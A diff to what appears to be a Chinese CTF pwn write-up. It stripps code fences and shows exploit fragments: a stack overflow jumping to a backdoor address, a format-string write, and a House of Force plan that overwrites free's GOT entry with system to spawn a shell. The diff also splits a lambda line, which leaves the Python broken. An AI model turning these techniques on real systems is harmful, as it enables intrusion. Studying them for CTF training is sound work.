@@ -61,37 +61,17 @@
 4. home：UAF
 5. world：House of force
 6. final：隐藏文件分析
-```
-
-
-
-```
 hotel_backdoor = 0x4006B6
 sla('you?n',b'a'*0x38+p64(hotel_backdoor))
 sla('you!','./next')
-```
-
-
-
-```
 sla('you?n',b'%1515c%43$naaaa')
 sla('you!','./next')
-```
-
-
-
-```
 1. 覆盖top chunk，修改为 -1
 2. 将大部分got表中的函数都执行一次，以便写入真实地址
 3. 使用 house of force ，将 top chunk 迁移到 got 区域
 4. 将free.got替换为text中的 puts-ret gadget，这样就可以leak地址了
 5. 覆盖bss中的create_lock，使得我们可以继续执行一次覆盖top_chunk的操作。
 6. 重新覆盖got中的free函数为system函数，最后触发system('/bin/sh')
-```
-
-
-
-```
 #!/usr/bin/python3
 from pwn import *
 
@@ -102,7 +82,8 @@ sla=lambda x,y:p.sendlineafter(x,y)
 ru=lambda x:p.recvuntil(x)
 rv=lambda x:p.recv(x)
 io=lambda :p.interactive()
-ps=lambda :pause()
+ps=lambda :
+pause()
 
 context.log_level = 'debug'
 i64_max = (1<<64)-1
